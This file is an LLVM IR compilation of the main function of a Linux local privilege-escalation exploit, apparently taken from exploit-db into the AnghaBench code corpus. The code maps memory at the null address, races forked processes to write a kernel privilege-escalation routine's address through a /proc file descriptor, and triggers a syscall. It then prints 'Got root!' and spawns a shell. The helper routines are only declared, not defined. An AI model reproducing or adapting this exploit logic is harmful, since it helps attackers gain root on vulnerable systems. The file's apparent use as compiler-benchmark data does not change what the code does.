; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33321.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33321.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@uid = common dso_local global i32 0, align 4
@gid = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"fork\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c"/proc/%d/fd/4\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@iz_kern2600_10 = common dso_local global i64 0, align 8
@get_cur_task_and_escalate_priv = common dso_local global i64 0, align 8
@__NR_olduname = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [15 x i8] c"\09\09+ Got root!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2 x i32], align 4
  %7 = alloca i32, align 4
  %8 = alloca [4 x i8], align 1
  %9 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 (...) @getuid()
  store i32 %10, i32* @uid, align 4
  %11 = call i32 (...) @getgid()
  store i32 %11, i32* @gid, align 4
  %12 = load i32, i32* @uid, align 4
  %13 = load i32, i32* @uid, align 4
  %14 = load i32, i32* @uid, align 4
  %15 = call i32 @setresuid(i32 %12, i32 %13, i32 %14)
  %16 = load i32, i32* @gid, align 4
  %17 = load i32, i32* @gid, align 4
  %18 = load i32, i32* @gid, align 4
  %19 = call i32 @setresgid(i32 %16, i32 %17, i32 %18)
  %20 = call i32 (...) @map_struct_at_null()
  %21 = call i32 (...) @fork()
  store i32 %21, i32* %7, align 4
  %22 = load i32, i32* %7, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %88

26:                                               ; preds = %2
  %27 = load i32, i32* %7, align 4
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %29, label %71

29:                                               ; preds = %26
  %30 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %31 = load i32, i32* %7, align 4
  %32 = call i32 @sprintf(i8* %30, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i32 %31)
  br label %33

33:                                               ; preds = %61, %29
  %34 = call i32 @is_done(i32 0)
  %35 = icmp ne i32 %34, 0
  %36 = xor i1 %35, true
  br i1 %36, label %37, label %62

37:                                               ; preds = %33
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %39 = load i32, i32* @O_RDWR, align 4
  %40 = call i32 @open(i8* %38, i32 %39)
  %41 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  store i32 %40, i32* %41, align 4
  %42 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %43 = load i32, i32* %42, align 4
  %44 = icmp ne i32 %43, -1
  br i1 %44, label %45, label %61

45:                                               ; preds = %37
  %46 = load i64, i64* @iz_kern2600_10, align 8
  %47 = icmp ne i64 %46, 0
  br i1 %47, label %48, label %57

48:                                               ; preds = %45
  %49 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %50 = load i64, i64* @get_cur_task_and_escalate_priv, align 8
  %51 = inttoptr i64 %50 to i8*
  %52 = call i32 @memcpy(i8* %49, i8* %51, i32 4)
  %53 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %56 = call i32 @write(i32 %54, i8* %55, i32 4)
  br label %57

57:                                               ; preds = %48, %45
  %58 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %59 = load i32, i32* %58, align 4
  %60 = call i32 @close(i32 %59)
  br label %61

61:                                               ; preds = %57, %37
  br label %33

62:                                               ; preds = %33
  %63 = load i64, i64* @iz_kern2600_10, align 8
  %64 = icmp ne i64 %63, 0
  br i1 %64, label %65, label %68

65:                                               ; preds = %62
  %66 = load i32, i32* @__NR_olduname, align 4
  %67 = call i32 @syscall(i32 %66, i32* null)
  br label %68

68:                                               ; preds = %65, %62
  %69 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  %70 = call i32 (...) @gomu_gomu_nooooo_gatling_shell()
  store i32 0, i32* %3, align 4
  br label %88

71:                                               ; preds = %26
  br label %72

72:                                               ; preds = %87, %71
  %73 = call i32 @is_done(i32 0)
  %74 = icmp ne i32 %73, 0
  %75 = xor i1 %74, true
  br i1 %75, label %76, label %88

76:                                               ; preds = %72
  %77 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %78 = call i32 @pipe(i32* %77)
  %79 = icmp ne i32 %78, -1
  br i1 %79, label %80, label %87

80:                                               ; preds = %76
  %81 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %82 = load i32, i32* %81, align 4
  %83 = call i32 @close(i32 %82)
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %85 = load i32, i32* %84, align 4
  %86 = call i32 @close(i32 %85)
  br label %87

87:                                               ; preds = %80, %76
  br label %72

88:                                               ; preds = %24, %68, %72
  %89 = load i32, i32* %3, align 4
  ret i32 %89
}

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @setresuid(i32, i32, i32) #1

declare dso_local i32 @setresgid(i32, i32, i32) #1

declare dso_local i32 @map_struct_at_null(...) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @is_done(i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @syscall(i32, i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @gomu_gomu_nooooo_gatling_shell(...) #1

declare dso_local i32 @pipe(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
